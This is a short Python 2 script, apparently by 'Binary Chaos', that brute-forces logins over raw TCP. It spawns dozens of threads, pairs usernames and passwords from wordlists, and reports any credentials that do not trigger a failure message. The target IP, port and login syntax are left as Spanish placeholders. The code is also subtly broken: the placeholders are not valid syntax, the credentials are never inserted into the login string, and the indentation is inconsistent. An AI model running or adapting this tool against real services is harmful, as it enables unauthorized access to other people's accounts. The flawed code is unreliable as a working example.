#!/usr/bin/python
 
import threading
import Queue
import socket
 
ListaDeUsuarios = open('users.txt','r').read().splitlines()
ListaDePasswords = open('passwords.txt','r').read().splitlines()
 
class WorkerThread(threading.Thread) :
 
    def __init__(self, queue, tid) :
        threading.Thread.__init__(self)
        self.queue = queue
        self.tid = tid
 
    def run(self) :
        while True :
            username = None
 
            try :
                username = self.queue.get(timeout=1)
 
            except  Queue.Empty :
                return
 
            try :
                for password in ListaDePasswords:
                                    tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                    tcpSocket.connect(('### Modificar Por La IP a atacar ###',### Modificar por el puerto a atacar ###))
                                    tcpSocket.recv(1024)
                                    tcpSocket.send("### Syntax that allows login ###")
                                    if '### Fail Response ###' in tcpSocket.recv(1024):
                                            tcpSocket.close()
                                            print "Failed :( " + username + "/" + password
                                    else:
                                    		print "-----------------------------------------------------------------------"
                                            print "[+] Successful Login! Username: " + username + " Password: " + password
                                            print "-----------------------------------------------------------------------"
            except :
                raise
 
            self.queue.task_done()
 
queue = Queue.Queue()
 
threads = []
for i in range(1, 40) : # Number of threads
    worker = WorkerThread(queue, i)
    worker.setDaemon(True)
    worker.start()
    threads.append(worker)
 
for username in ListaDeUsuarios :
    queue.put(username)     # Push usernames onto queue
 
queue.join()
 
# Esperando los hilos de trabajo para salir
 
for item in threads :
    item.join()
print "-----------------------------------------------------------------------"
print "Testing Completado!"
print "-- Binary Chaos --"
print "-----------------------------------------------------------------------"
